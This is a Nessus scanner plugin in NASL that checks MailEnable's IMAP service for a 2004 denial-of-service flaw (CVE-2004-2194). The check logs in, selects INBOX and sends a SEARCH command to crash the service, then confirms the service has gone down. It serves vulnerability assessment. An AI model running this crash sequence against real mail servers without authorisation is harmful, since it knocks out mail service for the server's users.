#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(15487);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2004-2194");
  script_bugtraq_id(11418);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"10728");
  }

  name["english"] = "MailEnable IMAP Service Search DoS Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The target is running at least one instance of MailEnable's IMAP
service.  A flaw exists in MailEnable Professional Edition versions
1.5a-d that results in this service crashing if it receives a SEARCH
command.  An authenticated user could send this command either on
purpose as a denial of service attack or unwittingly since some IMAP
clients, such as IMP and Vmail, use it as part of the normal login
process. 

Solution : Upgrade to MailEnable Professional 1.5e or later.

Risk factor : Medium";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for Search DoS Vulnerability in MailEnable's IMAP Service";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "Denial of Service";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes", "global_settings.nasl");
  script_require_ports("Services/imap", 143);
  script_exclude_keys("imap/false_imap");
  script_require_keys("imap/login", "imap/password");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if ((user == "") || (pass == "")) {
  if (log_verbosity > 1) display("imap/login and/or imap/password are empty; skipped!\n");
  exit(1);
}

# NB: MailEnable doesn't truly identify itself in the banner so we just
#     blindly login and do a search to try to bring down the service 
#     if it looks like it's MailEnable.
port = get_kb_item("Services/imap");
if (!port) port = 143;
debug_print("checking for Search DoS Vulnerability in MailEnable's IMAP Service on port ", port, ".");
if (!get_port_state(port)) exit(0);
banner = get_kb_item("imap/banner/" + port);
if ("IMAP4rev1 server ready at" >!< banner) exit(0);

# Read banner.
soc = open_sock_tcp(port);
if (soc) {
  s = recv_line(socket:soc, length:1024);
  s = chomp(s);
  debug_print("S: '", s, "'.");

  tag = 0;

  # Try to log in.
  ++tag;
  # nb: MailEnable supports the obsolete LOGIN SASL mechanism,
  #     which I'll use.
  c = string("a", string(tag), " AUTHENTICATE LOGIN");
  debug_print("C: '", c, "'.");
  send(socket:soc, data:string(c, "\r\n"));
  s = recv_line(socket:soc, length:1024);
  s = chomp(s);
  debug_print("S: '", s, "'.");
  if (s =~ "^\+ ") {
    s = s - "+ ";
    s = base64_decode(str:s);
    if ("User Name" >< s) {
      c = base64(str:user);
      debug_print("C: '", c, "'.");
      send(socket:soc, data:string(c, "\r\n"));
      s = recv_line(socket:soc, length:1024);
      s = chomp(s);
      debug_print("S: '", s, "'.");
      if (s =~ "^\+ ") {
        s = s - "+ ";
        s = base64_decode(str:s);
      }
      if ("Password" >< s) {
        c = base64(str:pass);
        debug_print("C: '", c, "'.");
        send(socket:soc, data:string(c, "\r\n"));
      }
    }
  }
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    debug_print("S: '", s, "'.");
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp='';
  }

  # If successful, select the INBOX.
  if (resp && resp =~ "OK") {
    ++tag;
    c = string("a", string(tag), " SELECT INBOX");
    debug_print("C: '", c, "'.");
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      debug_print("S: '", s, "'.");
      m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
      resp='';
    }

    # If successful, search it.
    if (resp && resp =~ "OK") {
      ++tag;
      c = string("a", string(tag), " SEARCH UNDELETED");
      debug_print("C: '", c, "'.");
      send(socket:soc, data:string(c, "\r\n"));
      while (s = recv_line(socket:soc, length:1024)) {
        s = chomp(s);
        debug_print("S: '", s, "'.");
        m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
        if (!isnull(m)) {
          resp = m[1];
          break;
        }
        resp='';
      }

      # If we don't get a response, make sure the service is truly down.
      if (!resp) {
        debug_print("no response received.");
        close(soc);
        soc = open_sock_tcp(port);
        if (!soc) {
          debug_print("imap service is down.");
          security_warning(port);
          exit(0);
        }
        debug_print("imap service is up -- huh?");
      }
    }
  }

  # Logout.
  ++tag;
  c = string("a", string(tag), " LOGOUT");
  debug_print("C: '", c, "'.");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    debug_print("S: '", s, "'.");
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }
  close(soc);
}
